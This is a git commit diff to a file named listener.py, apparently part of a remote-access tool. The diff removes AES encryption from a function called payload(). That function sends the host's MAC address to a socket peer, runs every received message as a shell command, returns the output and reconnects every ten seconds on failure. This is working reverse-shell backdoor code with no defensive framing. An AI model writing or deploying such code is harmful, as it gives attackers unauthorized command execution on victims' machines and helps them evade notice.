827c9c182d9c9ee61a97c12b973882ff0c17ca0c
Bryan Rodriguez <z1n4@outlook.com>
2020-04-22 21:08:59 +0200

    Update listener.py

--- utils/listener.py
+++ utils/listener.py
@@ -4,19 +4,7 @@ import socket
 import uuid
 import base64
 import time
-from Crypto.Cipher import AES
 
-
-counter = b"H"*16
-key = b"H"*32
-
-def encrypt(message):
-    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-    return encrypto.encrypt(message)
-
-def decrypt(message):
-    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-    return  decrypto.decrypt(message)
 
 
 def payload():
@@ -28,12 +16,12 @@ def payload():
             a=hex(uuid.getnode())
             a = bytes(a, 'utf-8')
             a=base64.b64encode(a)
-            s.sendall(encrypt(a))
+            s.sendall(a)
             while True:
                 msg=s.recv(2048).decode('utf-8')
-                output = sp.getoutput(decrypt(msg))
+                output = sp.getoutput(msg)
                 msg = bytes(output + " ", 'utf-8')
-                s.sendall(encrypt(msg))
+                s.sendall(msg)
     except socket.error as error:
         time.sleep(10)
         payload()
